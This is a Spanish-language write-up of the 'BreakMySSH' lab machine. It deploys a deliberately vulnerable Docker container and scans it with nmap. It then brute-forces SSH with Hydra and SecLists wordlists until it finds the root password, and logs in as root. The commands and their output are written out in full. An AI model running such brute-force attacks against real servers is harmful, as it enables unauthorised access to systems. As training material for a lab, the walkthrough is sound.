# 5. Máquina: BreakMySSH
<a href="https://github.com/GutsNet"><img title="Author" src="https://img.shields.io/badge/Author-GutsNet-purple.svg?style=for-the-badge&logo=github"></a>

**Dificultad:** 🔵 *Muy Fácil*

**Autor:** *[El Pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)*

**Fecha de creación:** *29/05/2024*

**Proceso:**
- [1. Despliegue](#desplegando-la-máquina-vulnerable)
- [2. Escaneo de puertos](#escaneo-de-puertos-con-nmap)
- [3. Ataque de fuerza bruta](#fuerza-bruta-ssh-con-hydra)
- [4. Acceso con SSH](#acceso-al-servidor-ssh)
---

## Desplegando la Máquina Vulnerable

```python
~/BreakMySSH ᐅ sudo bash auto_deploy.sh breahmyssh.tar
```
Este comando ejecuta un script de bash (`auto_deploy.sh`) que despliega la máquina vulnerable a partir del archivo `breakmyssh.tar`.

**Salida:**

```python
Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

#### Verificación de Conectividad

```python
~/BreakMySSH ᐅ ping -c 2 172.17.0.2
```
El comando `ping -c 2` envía 2 paquetes ICMP a la dirección IP `172.17.0.2` para verificar la conectividad y la respuesta del host.

**Salida:**

```python
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.057 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.067 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1028ms
rtt min/avg/max/mdev = 0.057/0.062/0.067/0.005 ms
```

---

## Escaneo de Puertos con Nmap

```python
~/BreakMySSH ᐅ nmap -p- -sCV 172.17.0.2
```
Este comando revela quu el puertos `22` (SSH) están abiertos y tiene el servicio `OpenSSH 7.7` en ejecución.

**Salida:**

```python
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 1a:cb:5e:a3:3d:d1:da:c0:ed:2a:61:7f:73:79:46:ce (RSA)
|   256 54:9e:53:23:57:fc:60:1e:c0:41:cb:f3:85:32:01:fc (ECDSA)
|_  256 4b:15:7e:7b:b3:07:54:3d:74:ad:e0:94:78:0c:94:93 (ED25519)
```

**Explicación de parámetros:**

- `-p-`: Escanea todos los puertos (del 1 al 65535).
- `-sCV`: Realiza un escaneo con detección de versión (`-sV`) y utiliza scripts básicos (`-sC`) para obtener más información del servicio.

---

## Fuerza Bruta SSH con Hydra

La máquina no nos proporciona mas pistas, por tanto, la unica opción es realizar un ataque de fuera bruta al servicio SSH utilizando hydra.

```python
~/BreakMySSH ᐅ hydra -L $seclst/Usernames/top-usernames-shortlist.txt -P $seclst/Passwords/probable-v2-top12000.txt ssh://172.17.0.2 -I -t 32
```

**Salida:**

```python
[22][ssh] host: 172.17.0.2   login: root   password: estrella
```

Hydra encuentra la contraseña `estrella` para el usuario `root`. Tanto el usuario como la contraseña, fueron extraidos de algunas wordlists.

**Explicación de parámetros:**
- `-L`: Establece la wordlist con usuarios.
 - `-P`: Especifica la wordlist de contraseñas.
 - `ssh://172.17.0.2`: Define el protocolo y la IP del objetivo.
- `-I`: Ejecuta el ataque inmediatamente sin demora.
- `-t 32`: Utiliza 32 tareas en paralelo.

---

## Acceso al Servidor SSH

```python
~/BreakMySSH ᐅ ssh root@172.17.0.2
```

Este comando inicia una sesión SSH en la máquina como el usuario `root`.

**Salida:**
 ```python
root@172.17.0.2's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@95513d5d3ca3:~#
```

**Comprobación:**
```
root@95513d5d3ca3:~# whoami
root
```
